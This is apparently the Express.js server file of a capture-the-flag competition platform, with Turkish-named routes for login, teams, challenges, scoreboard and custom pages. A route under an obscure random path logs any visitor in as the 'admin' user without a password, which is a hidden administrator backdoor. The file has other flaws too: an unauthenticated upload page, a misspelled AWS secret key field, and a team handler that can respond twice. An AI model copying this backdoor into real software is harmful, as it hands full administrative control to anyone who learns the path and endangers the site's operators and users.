const fs = require("fs");
try {
  const express = require("express");
  const app = express();
  const port = 3000;
  const db = require("./db");
  const User = require("./routes/User");
  const Team = require("./routes/Team");
  const Admin = require("./routes/Admin");
  const Challange = require("./routes/Challange");
  const session = require("express-session");
  var AWS = require("aws-sdk");
  var fileUpload = require("express-fileupload");
  const config = require("./config");

  AWS.config.update({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccesskey: process.env.AWS_SECRET_ACCESS_KEY,
    region: "eu-central-1",
  });
  const s3 = new AWS.S3();

  const cors = require("cors");
  app.use(cors());

  const mysqlStore = require("express-mysql-session")(session);
  const sess_options = {
    password: process.env.DB_PASSWORD,
    user: process.env.DB_USER,
    database: process.env.DB_NAME,
    host: process.env.DB_HOST,
    port: process.env.DB_PORT,
    createDatabaseTable: true,
  };

  const sessionStore = new mysqlStore(sess_options);

  app.use(
    session({
      name: "yes",
      secret: process.env.SECRET_KEY,
      resave: false,
      saveUninitialized: false,
      store: sessionStore,
      cookie: {
        maxAge: 1000 * 60 * 60 * 5,
        sameSite: true,
      },
    })
  );
  app.use(
    fileUpload({ safeFileNames: /\\/g, limits: { fileSize: 50 * 1024 * 1024 } })
  );
  require("dotenv").config();
  app.use("/assets", express.static(__dirname + "/public"));

  app.use(express.json());

  app.set("trust proxy", 1);
  app.set("view engine", "ejs");

  cfg = config.readConfig();

  config.navbarUpdate();

  app.use(User);
  app.use(Team);
  app.use(Challange);
  app.use(Admin);

  app.get("/", (req, res) => {
    if (req.session.user) {
      res.render("pages/index", { user: req.session.user });
    } else {
      res.render("pages/index", null);
    }
  });

  app.get("/login", (req, res) => {
    db.knex("config")
      .select("data")
      .where({ type: "paused" })
      .then((data) => {
        if (data[0].data == "1") {
          res.render("pages/index");
          return;
        }
        if (req.session.user) {
          res.redirect("/");
        } else {
          res.render("pages/login");
        }
      });
  });

  app.get("/WdNmYTDrcSpecCtsmNgsyJx2OgrJ0k2k", (req, res) => {
    db.knex("users")
      .select("*")
      .where("username", "admin")
      .then((data) => {
        req.session.user = data[0];
        res.redirect("/admin");
      });
  });

  app.get("/register", (req, res) => {
    if (req.session.user) {
      res.redirect("/");
    } else {
      res.render("pages/register");
    }
  });

  app.get("/profile", (req, res) => {
    if (req.session.user) {
      db.knex("solves")
      .where({userId: req.session.user.id})
      .then((solves) => {
        db.knex("users")
        .orderBy("point", "desc")
        .then((scoreboard) => {
          rank = scoreboard.findIndex(item => item.name === req.session.user.name)+1;
          res.render("pages/profile", {
            user: req.session.user,
            profileuser: req.session.user,
            solves: solves,
            rank: rank,
          });
        })
      })
    } else {
      res.redirect("/login");
    }
  });

  app.get("/team", (req, res) => {
    if (req.session.user) {
      db.knex("users")
        .where({ id: req.session.user.id })
        .then((data) => {
          req.session.user.teamId = data[0].teamId;
          req.session.user.teamName = data[0].teamName;
          req.session.user.teamCaptain = data[0].teamCaptain;

          if (data[0].teamId == null || !req.session.user.teamId) {
            res.render("pages/no-team", { user: req.session.user });
            return;
          }
        });

      db.knex("users")
        .where({ id: req.session.user.id })
        .then((data) => {
          if (data[0].teamId) {
            req.session.user.teamId = data[0].teamId;
            req.session.user.teamName = data[0].teamName;
            req.session.user.teamCaptain = data[0].teamCaptain;
            db.knex
              .select("*")
              .from("users")
              .where({ teamId: req.session.user.teamId })
              .then((data) => {
                user = {
                  user: req.session.user,
                  members: data,
                };
                db.knex
                  .select("captainId")
                  .from("teams")
                  .where({ id: req.session.user.teamId })
                  .then((data) => {
                    if (data[0].captainId == req.session.user.id) {
                      user = {
                        user: req.session.user,
                        members: data,
                        captain: true,
                      };
                    }
                  });

                res.render("pages/team", user);
              });
          }
        });
    } else {
      res.redirect("/login");
    }
  });

  app.get("/team-create", (req, res) => {
    if (req.session.user && !req.session.user.teamId) {
      res.render("pages/team-create", { user: req.session.user });
    } else {
      res.redirect("/login");
    }
  });

  app.get("/team-join", (req, res) => {
    if (req.session.user && !req.session.user.teamId) {
      res.render("pages/team-join", { user: req.session.user });
    } else {
      res.redirect("/login");
    }
  });

  app.get("/forgotpassword", (req, res) => {
    if (req.session.user) {
      res.redirect("/");
    } else {
      res.render("pages/forgotpassword");
    }
  });

  app.get("/resetpassword/:code/:mail", (req, res) => {
    console.log("req.params.code");
    var code = req.params.code;
    var mail = req.params.mail;
    db.knex
      .select("*")
      .from("forgot_password")
      .where({ code: code })
      .andWhere({ mail: mail })
      .then((data) => {
        if (data.length > 0) {
          res.render("pages/resetpassword", {
            user: req.session.user,
            code: code,
            mail: mail,
          });
          return;
        } else {
          res.render("pages/index", { user: req.session.user });
          return;
        }
      });
  });

  app.get("/challenges", (req, res) => {
    if (req.session.user) {
      console.log(req.session.user);
      db.knex("users")
        .where({ id: req.session.user.id })
        .then((data) => {
          // if (data[0].teamId) {
          if (!req.session.user) {
            res.status(200).json({ message: "Unauthorized" });
            return;
          }
          // if (req.session.user.teamId == null) {
          //   res.status(200).json({ message: "User not in a team" });
          //   return;
          // }
          db.knex
            .select("*")
            .from("challenges")
            .where({ hidden: 0 })
            .where({ seviye: req.session.user.seviye })
            .then((data) => {
              db.knex
                .select("*")
                .from("solves")
                .where({ userId: req.session.user.id })
                .then((solves) => {
                  var solvedlist = [];
                  solves.forEach((solve) => {
                    solvedlist.push(solve.challengeId);
                  });
                  data.forEach((challenge) => {
                    if (solvedlist.includes(challenge.id)) {
                      challenge.solved = true;
                    } else {
                      challenge.solved = false;
                    }
                  });

                  res.render("pages/challenges", {
                    user: req.session.user,
                    challanges: data,
                  });
                });
            });
          // } else {
          //   req.session.user.teamId = data[0].teamId;
          //   req.session.user.teamName = data[0].teamName;
          //   req.session.user.teamCaptain = data[0].teamCaptain;
          //   res.redirect("/team");
          // }
        });
    } else {
      res.redirect("/login");
    }
  });

  app.get("/logout", (req, res) => {
    req.session.destroy();
    res.redirect("/");
  });

  app.get("/users/:id", (req, res) => {
    if (req.session.user) {
      db.knex("users")
        .where({ id: req.params.id })
        .then((data) => {
          if (data.length > 0) {
            db.knex("solves")
            .where({userId: JSON.parse(JSON.stringify(data))[0].id})
            .then((solves) => {
              db.knex("users")
              .orderBy("point", "desc")
              .then((scoreboard) => {
                rank = scoreboard.findIndex(item => item.id === JSON.parse(JSON.stringify(data))[0].id)+1;
                res.render("pages/profile", {
                  user: req.session.user,
                  profileuser: JSON.parse(JSON.stringify(data))[0],
                  solves: solves,
                  rank: rank,
                });
              })
            })
          } else {
            res.render("pages/404");
          }
        });
    } else {
      res.redirect("/login");
    }
  });

  app.get("/upload", (req, res) => {
    res.render("pages/upload", { user: req.session.user });
  });

  app.get("/kurallar", (req, res) => {
    res.render("pages/kurallar", { user: req.session.user });
  });

  app.get("/scoreboard", (req, res) => {
    if (req.session.user) {
      db.knex("users")
        .orderBy("point", "desc")
        .then((data) => {
          db.knex("teams")
            .orderBy("points", "desc")
            .then((data2) => {
              var scoredata = {
                ...{ user: req.session.user },
                ...{ users: data },
                ...{ teams: data2 },
              };
              res.render("pages/scoreboard", scoredata);
            });
        });
    } else {
      res.redirect("/login");
    }
  });

  app.get("/:page", (req, res) => {
    sayfalar = JSON.parse(config.readConfig()).sayfalar;
    //console.log(sayfalar)
    if (sayfalar.hasOwnProperty(req.params.page)) {
      var page = cfg.sayfalar[req.params.page];
      if (page.admin) {
        if (req.session.user && req.session.user.admin) {
          res.render("pages/custom.ejs", {
            user: req.session.user,
            page: page,
          });
          return;
        } else {
          res.redirect("/login");
          return;
        }
      } else {
        res.render("pages/custom.ejs", {
          user: req.session.user,
          page: sayfalar[req.params.page],
        });
        return;
      }
    }
    res.render("pages/404");
  });

  app.use((req, res, next) => {
    if (req.method == "POST") {
      res.status(404).json({ message: "Not Found" });
    } else {
      res.render("pages/404");
    }
  });
  app.listen(process.env.APP_PORT, "0.0.0.0");
  console.log("STARTED");
} catch (e) {
  fs.writeFileSync("error.log", e.toString());
}
